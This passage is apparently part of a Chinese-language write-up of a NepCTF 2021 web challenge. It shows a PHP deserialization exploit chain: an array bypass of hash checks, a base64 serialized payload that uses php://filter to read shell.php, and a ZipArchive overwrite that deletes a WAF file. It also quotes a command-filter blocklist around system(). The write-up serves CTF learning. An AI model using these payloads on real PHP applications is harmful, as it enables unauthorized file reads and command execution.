property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>分析下，首先要绕<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>，直接数组绕过，传入<code>./?a[]=1&amp;b[]=a</code>即可，如下</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="读取shell-php："><a href="#读取shell-php：" class="headerlink" title="读取shell.php："></a>读取shell.php：</h5><p>看Game类</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>看到<code>__wakeup</code>第一反应可不可以直接绕，看了下版本<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124反序列化绕过wakeup漏洞。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>乖乖走<code>__wakeup</code>，register类没有作用，看来得走login类</p><p>参数<code>register</code>的md5要为<code>21232f297a57a5a743894a0e4a801fc3</code>，一查，<code>admin</code></p><p>那就没问题了，<code>__wakeup</code>将Game类的<code>file</code>/<code>filename</code>/<code>content</code>传入login，利用login的<code>__construct</code>赋值</p><p>Game类的变量choice即login类，利用Game类<code>__destruct</code>触发login类的checking函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>login类的checking函数检查赋值的username和password，即Game类传过来的username和password。然后调用file即Game类的file的open函数。由于没有<code>__call</code>之类的魔术方法，不需要考虑其他。即本题所有变量都可在Game类直接赋值。</p><p>关键点就在于Open类了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>如图所示，存在waf.txt，<code>file_get_contents</code>为true，即存在waf.txt时会<code>file_get_contents($filename.&quot;.php&quot;);</code>，否则会<code>shell($content);</code>所以我们首先要利用伪协议读取<code>shell.php</code>的内容。</p><p>exp1.php如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'php://filter/convert.base64-encode/resource=shell'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 目录下必须有 shell.php waf.txt</span></span></code></pre><p>得到payload</p><pre class="language-php" data-language="php"><code class="language-php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30<span class="token operator">=</span></code></pre><img src="/article/Nepctf2021/image-20210322161745412.png" class="" title="image-20210322161745412" loading="lazy"><p>读取到<code>shell.php</code>内容</p><pre class="language-php" data-language="php"><code class="language-php">// shell.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/'</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'so long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>就是传入一个命令，过滤一堆读取函数然后长度要小于10并读取flag。</p><p>稍后再研究，那么现在的问题就是进shell函数，然而进shell函数写死了必须要waf.txt不存在。但waf.txt是有的</p><img src="/article/Nepctf2021/image-20210322162252803.png" class="" title="waf" loading="lazy"><p>这就为难我胖虎了，思路至此over了。</p><hr><h5 id="删除waf-txt："><a href="#删除waf-txt：" class="headerlink" title="删除waf.txt："></a>删除waf.txt：</h5><p>寻找大佬博客文章，找到了指引思路的<a href="https://blog.csdn.net/weixin_42444939/article/details/100781890">文章</a>，2019bytectf的一道web题EzCMS，原题要删除/覆盖目录下<code>.hatccess</code>，刚好本题的login类有漏洞可寻，php手册里查找open的同名函数，利用<a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>，其第二个参数里存在能覆盖指定文件的模式，直接删掉<code>waf.txt</code></p><p>于是准备好了phar文件准备‘远程phar’反序列化，但是phar伪协议是不可以远程的</p><img src="/article/Nepctf2021/image-20210322163503746.png" class="" title="phar" loading="lazy"><p>孩子比较呆，测了有一会。这里受到了那题固有思维的影响，其实并不需要打phar反序列化的，由login类中checking函数<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content)</code>，直接令Game类的file new一个ZipArchive()，filename即为waf.txt，content为模式<code>ZipArchive::OVERWRITE | ZipArchive::CREATE</code>，也就是9</p><img src="/article/Nepctf2021/image-20210322164126786.png" class="" title="type" loading="lazy"><p>测试如下</p><img src="/article/Nepctf2021/image-20210322164402187.png" class="" title="del" loading="lazy"><p>可见waf.txt成功被删除，exp2如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'类同上    '</span><span class="token single-quoted-string string">''</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span 